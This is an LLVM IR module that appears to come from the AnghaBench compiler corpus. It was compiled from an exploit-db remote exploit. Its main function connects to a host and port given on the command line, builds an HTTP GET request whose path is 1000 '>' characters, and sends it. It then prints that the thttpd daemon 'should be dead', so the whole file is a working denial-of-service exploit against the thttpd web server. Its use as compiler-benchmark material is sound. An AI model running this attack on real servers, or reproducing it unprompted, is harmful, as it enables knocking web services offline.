; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23306.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23306.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.in_addr }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"usage: %s <host> <port>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [17 x i8] c"socket() failed\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"gethostbyname() failed\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"couldn't connect to server\0A\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"GET /%s HTTP/1.0\0D\0A\0D\0A\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [52 x i8] c"\0A(Drink Tongkat-Ali For Better Performance ;P~ !)\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"Buffer is: %s\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [37 x i8] c"Buffer filled... now sending buffer\0A\00", align 1
@.str.8 = private unnamed_addr constant [52 x i8] c"Buffer sent.\0ANow thttpd daemon should be dead !!!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca [1000 x i8], align 16
  %9 = alloca [1130 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 3
  br i1 %13, label %14, label %21

14:                                               ; preds = %2
  %15 = load i32, i32* @stderr, align 4
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 @fprintf(i32 %15, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %18)
  %20 = call i32 @exit(i32 0) #4
  unreachable

21:                                               ; preds = %2
  %22 = load i32, i32* @AF_INET, align 4
  %23 = load i32, i32* @SOCK_STREAM, align 4
  %24 = call i32 @socket(i32 %22, i32 %23, i32 0)
  store i32 %24, i32* %10, align 4
  %25 = load i32, i32* %10, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %30

27:                                               ; preds = %21
  %28 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %29 = call i32 @exit(i32 0) #4
  unreachable

30:                                               ; preds = %21
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call %struct.hostent* @gethostbyname(i8* %33)
  store %struct.hostent* %34, %struct.hostent** %7, align 8
  %35 = load %struct.hostent*, %struct.hostent** %7, align 8
  %36 = icmp eq %struct.hostent* %35, null
  br i1 %36, label %37, label %40

37:                                               ; preds = %30
  %38 = call i32 @herror(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %39 = call i32 @exit(i32 0) #4
  unreachable

40:                                               ; preds = %30
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %42 = load %struct.hostent*, %struct.hostent** %7, align 8
  %43 = getelementptr inbounds %struct.hostent, %struct.hostent* %42, i32 0, i32 0
  %44 = load i64, i64* %43, align 8
  %45 = inttoptr i64 %44 to %struct.in_addr*
  %46 = bitcast %struct.in_addr* %41 to i8*
  %47 = bitcast %struct.in_addr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %46, i8* align 4 %47, i64 4, i1 false)
  %48 = load i32, i32* @AF_INET, align 4
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %48, i32* %49, align 4
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 2
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @atol(i8* %52)
  %54 = call i32 @htons(i32 %53)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %54, i32* %55, align 4
  %56 = load i32, i32* %10, align 4
  %57 = call i32 @connect(i32 %56, %struct.sockaddr_in* %6, i32 12)
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %59, label %62

59:                                               ; preds = %40
  %60 = call i32 @perror(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %61 = call i32 @exit(i32 0) #4
  unreachable

62:                                               ; preds = %40
  store i32 0, i32* %11, align 4
  br label %63

63:                                               ; preds = %70, %62
  %64 = load i32, i32* %11, align 4
  %65 = icmp slt i32 %64, 1000
  br i1 %65, label %66, label %73

66:                                               ; preds = %63
  %67 = load i32, i32* %11, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [1130 x i8], [1130 x i8]* %9, i64 0, i64 %68
  store i8 62, i8* %69, align 1
  br label %70

70:                                               ; preds = %66
  %71 = load i32, i32* %11, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %11, align 4
  br label %63

73:                                               ; preds = %63
  %74 = getelementptr inbounds [1000 x i8], [1000 x i8]* %8, i64 0, i64 0
  %75 = getelementptr inbounds [1130 x i8], [1130 x i8]* %9, i64 0, i64 0
  %76 = call i32 @sprintf(i8* %74, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0), i8* %75)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.5, i64 0, i64 0))
  %78 = getelementptr inbounds [1130 x i8], [1130 x i8]* %9, i64 0, i64 0
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0), i8* %78)
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.7, i64 0, i64 0))
  %81 = load i32, i32* %10, align 4
  %82 = getelementptr inbounds [1000 x i8], [1000 x i8]* %8, i64 0, i64 0
  %83 = getelementptr inbounds [1000 x i8], [1000 x i8]* %8, i64 0, i64 0
  %84 = call i32 @strlen(i8* %83)
  %85 = call i32 @send(i32 %81, i8* %82, i32 %84, i32 0)
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.8, i64 0, i64 0))
  %87 = load i32, i32* %10, align 4
  %88 = call i32 @close(i32 %87)
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atol(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr_in*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
